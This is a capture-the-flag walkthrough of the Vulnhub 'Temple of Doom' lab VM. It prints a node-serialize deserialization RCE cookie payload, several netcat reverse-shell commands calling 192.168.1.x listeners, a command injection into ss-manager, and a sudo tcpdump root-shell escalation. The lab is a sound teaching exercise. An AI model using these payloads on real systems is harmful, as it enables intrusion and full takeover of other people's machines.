# Temple of doom:1 ~Vulnhub Walkthrough
Temple of Doom is a CTF challenge VM on vulnhub made by 0katz. The aim of this lab is to capture the flag in the root directory of the system. This lab is inspired by the Indiana Jones movie Temple of Doom. The level of this lab is easy/intermediate.

## Scanning

Scanning host using nmap

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled.png)

Service version and aggressive scan

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%201.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%201.png)

## Enumeration

Trying to connect through ssh

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%202.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%202.png)

Bruteforce password for root using hydra

hydra -l root -P <wordlist> <target> ssh

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%203.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%203.png)

we found nothing in hydra.

Then we browsed 666 port

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%204.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%204.png)

When refreshing it i found JSON error.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%205.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%205.png)

We intercepted request in burp and found base64 encoded cookie.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%206.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%206.png)

After decoding base64 we found json string

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%207.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%207.png)

We removed token part.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%208.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%208.png)

We send this request after encoding it in base64.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%209.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%209.png)

We observed that admin is reflected in our response.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2010.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2010.png)

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2011.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2011.png)

## Exploitation

***We observed that node-serialize is used in this. And Node-serialize is vulnerable to RCE. Then we followed node-serialize rce attack blog by ajin-abraham ([https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)) and used payload

```
**{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('id',
(error, stdout, stderr)=>{ console.log(stdout); }); }()"}**
```

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2012.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2012.png)

We put above payload in cookie field and encode it with base64 and send request.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2013.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2013.png)

Our payload runs successfully and executed id command.

Try to take reverse shell. Start listening on port 1234

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2014.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2014.png)

Put Following payload in cookie and encode it with base 64 to take reverse shell

```
**{"username":"_$$ND_FUNC$$_function (){return require('child_process').execSync('nc -e 
/bin/bash 192.168.1.6 1234', (error, stdout, stderr)=>{ console.log(stdout); }); }()"}**
```

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2015.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2015.png)

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2016.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2016.png)

After sending request we got shell of target user.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2017.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2017.png)

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2018.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2018.png)

cat /etc/passwd — check how many users are there in target system other than nodeadmin. We found other user **fireman.**

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2019.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2019.png)

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2020.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2020.png)

Lets check which services are runnning by fireman user. We found ss-manager

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2021.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2021.png)

Serach ss-manager exploit on google. 

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2022.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2022.png)

We will use above command to take reverse shell of fireman user

**nc -u 127.0.0.1 8839**

**add: {"server_port":8003, "password":"test", "method":"|| nc 192.168.1.6 5555 -e /bin/bash||"}**

Side by side start listener on port 5555

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2023.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2023.png)

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2024.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2024.png)

We got reverse shell of fireman user.

## Privilege escalation

Now we'll check sudoers list.

**sudo -l**

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2025.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2025.png)

We found tcpdump. 

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2026.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2026.png)

Execute following command one by one and start listening on 5001 port

```
**COMMAND='nc 192.168.1.16 5001 -e /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root**
```

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2027.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2027.png)

Wait for 2-3 minutes and then quit.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2028.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2028.png)

We got root shell of target system.

![Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2029.png](Temple%20of%20Doom%201%20Vulnhub%20Walkthrough%20f4120937706543bca5156c05cad1e232/Untitled%2029.png)
